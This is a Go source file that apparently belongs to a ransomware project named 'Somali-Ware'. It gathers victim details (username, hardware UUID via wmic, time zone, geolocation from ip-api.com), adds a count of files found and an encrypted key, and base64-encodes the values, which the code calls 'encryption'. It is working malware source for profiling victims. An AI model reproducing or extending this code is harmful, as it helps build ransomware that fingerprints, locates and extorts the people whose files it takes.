package system

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"Somali-Ware/modules/cache"
	"Somali-Ware/modules/structs"
	"Somali-Ware/settings"
)

func GetSystemInfo() (structs.SystemInfo, error) {
	ip_info := GetIPInfo()
	lat_long := strings.Split(ip_info, ":")[0] + ":" + strings.Split(ip_info, ":")[1]
	country_code := strings.Split(ip_info, ":")[2]

	system_info := structs.SystemInfo{
		Username:     encryptString(GetUsername()),
		HWID:         encryptString(GetHWID()),
		Date:         encryptString(GetDate()),
		TimeZone:     encryptString(GetTimeZone()),
		LatLong:      encryptString(lat_long),
		CountryCode:  encryptString(country_code),
		FilesFound:   encryptInt(cache.FilesFound),
		EncryptedKey: settings.EncryptedKey,
	}

	return system_info, nil
}

func GetUsername() string {
	return os.Getenv("USERNAME")
}

func GetHWID() string {
	cmd := exec.Command("wmic", "csproduct", "get", "UUID")
	out, err := cmd.Output()
	if err != nil {
		return err.Error()
	}

	fixed := strings.Split(string(out), "\n")[1]

	return strings.TrimSpace(fixed)
}

func GetDate() string {
	return time.Now().Format(time.DateOnly)
}

func GetTimeZone() string {
	// This is just fucking wrong but idc anymore I fuckin give up
	now := time.Now()

	_, offset := now.Zone()

	offsetHours := offset / 3600
	offsetMinutes := (offset % 3600) / 60

	offsetString := fmt.Sprintf("UTC%+d", offsetHours)
	if offsetMinutes != 0 {
		offsetString = fmt.Sprintf("%s:%02d", offsetString, offsetMinutes)
	}

	return offsetString
}

func GetIPInfo() string {
	url := "http://ip-api.com/json"

	resp, err := http.Get(url)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()

	ip_address := structs.IPInfo{}

	err = json.NewDecoder(resp.Body).Decode(&ip_address)
	if err != nil {
		fmt.Println(err.Error())
		return ""
	}

	return convertFloat(ip_address.Lon) + ":" + convertFloat(ip_address.Lat) + ":" + ip_address.CountryCode
}

func convertFloat(float float64) string {
	return strconv.FormatFloat(float, 'f', -1, 64)
}

func encryptString(input string) string {
	return base64.StdEncoding.EncodeToString([]byte(input))
}

func encryptInt(input int) string {
	return base64.StdEncoding.EncodeToString([]byte(strconv.Itoa(input)))
}
